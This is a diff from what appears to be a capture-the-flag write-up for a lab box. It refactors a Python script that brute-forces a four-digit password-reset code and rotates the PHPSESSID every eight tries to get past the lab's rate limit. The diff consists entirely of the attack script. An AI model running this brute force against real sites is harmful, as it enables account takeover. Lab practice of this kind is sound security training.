@@ -97,98 +97,101 @@ New `PHPSESSID` in the Set-Cookie
 ```python
 import requests
 
+
+class BruteForce:
+
+    s = requests.Session()
+
+    N = 8
+    MAX_CODE = 9999
+    PORT = 1337
+    EMAIL = 'tester@hammer.thm'
+
+    def __init__(self, IP):
+        self.IP = IP
+
+        self.headers = {
+            'Host': f'{IP}{self.PORT}',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0'
+        }
+
+        self.URL = f'http://{IP}:{self.PORT}'
+
+    def retrieve_new_session(self):
+        self.s = requests.Session()
+
+        # session is updated automatically
+        self.s.get(f'{self.URL}/index.php', headers=self.headers)
+
+    def associate_email_with_new_session(self):
+        data = {
+            'email': self.EMAIL
+        }
+
+        self.s.post(f'{self.URL}/reset_password.php',
+                    headers=self.headers, data=data)
+
+    def start(self):
+        try:
+            # retrieve initial session
+            self.retrieve_new_session()
+
+            # enter email
+            self.associate_email_with_new_session()
+
+            iterations = self.MAX_CODE+1
+
+            for i in range(1000, iterations):
+
+                if i % self.N == 0 and i != 0:
+                    print('[INFO] Retrieving new PHPSESSID')
+
+                    # request for a new PHPSESSID
+                    self.retrieve_new_session()
+
+                    # enter email
+                    self.associate_email_with_new_session()
+
+                # zero pads to 4 digits
+                code = f'{i:04d}'
+
+                data = {
+                    'recovery_code': code,
+                    's': 200
+                }
+
+                print(f'[INFO] Trying code={code}')
+
+                res = self.s.post(f'{self.URL}/reset_password.php',
+                                  headers=self.headers, data=data)
+
+                res_text = res.text
+                res_status_code = res.status_code
+                res_content_length = len(res.text)
+                req_cookies = self.s.cookies.get_dict()
+
+                print(f'status={res_status_code} content_length={
+                    res_content_length} cookies={req_cookies}')
+
+                # wrong code
+                if 'Invalid or expired recovery code!' in res_text:
+                    print("\033[91mWrong code!\033[0m")
+
+                # valid code found
+                else:
+                    print("\033[92mSuccess!\033[0m")
+                    print(f'code={code}')
+                    exit()
+
+        except KeyboardInterrupt:
+            exit()
+
+
 IP = input('[!] Enter the target IP address: ')
 
-N = 8
-MAX_CODE = 9999
-PORT = 1337
-URL = f'http://{IP}:{PORT}'
-EMAIL = 'tester@hammer.thm'
-
-headers = {
-    'Host': f'{IP}{PORT}',
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0'
-}
-
-
-def retrieve_new_session():
-    with requests.Session() as s:
-        # session is updated automatically
-        s.get(f'{URL}/index.php', headers=headers)
-
-    return s
-
-
-def enter_email(s):
-    data = {
-        'email': EMAIL
-    }
-
-    s.post(f'{URL}/reset_password.php',
-           headers=headers, data=data)
-
-
-def brute_force():
-
-    try:
-
-        # retrieve initial session
-        s = retrieve_new_session()
-
-        # enter email
-        enter_email(s)
-
-        iterations = MAX_CODE+1
-
-        for i in range(iterations):
-
-            if i % N == 0 and i != 0:
-                print('[INFO] Retrieving new PHPSESSID')
-
-                # request for a new PHPSESSID
-                s = retrieve_new_session()
-
-                # enter email
-                enter_email(s)
-
-            code = f'{i:04d}'
-
-            data = {
-                'recovery_code': code,
-                's': 200
-            }
-
-            print(f'[INFO] Trying code={code}')
-
-            res = s.post(f'{URL}/reset_password.php',
-                         headers=headers, data=data)
-
-            res_text = res.text
-            res_status_code = res.status_code
-            res_content_length = len(res.text)
-            req_cookies = s.cookies.get_dict()
-
-            # print(res_text)
-
-            print(f'[INFO] status={res_status_code} content_length={
-                res_content_length} cookies={req_cookies}')
-
-            # wrong code
-            if 'Invalid or expired recovery code!' in res_text:
-                print('[INFO] Wrong code!')
-
-            # valid code found
-            else:
-                print('[INFO] Success!')
-                print(f'code={code}')
-                exit()
-
-    except KeyboardInterrupt:
-        exit()
-
-
-brute_force()
+bruteforce = BruteForce(IP)
+bruteforce.start()
 
 ```
 
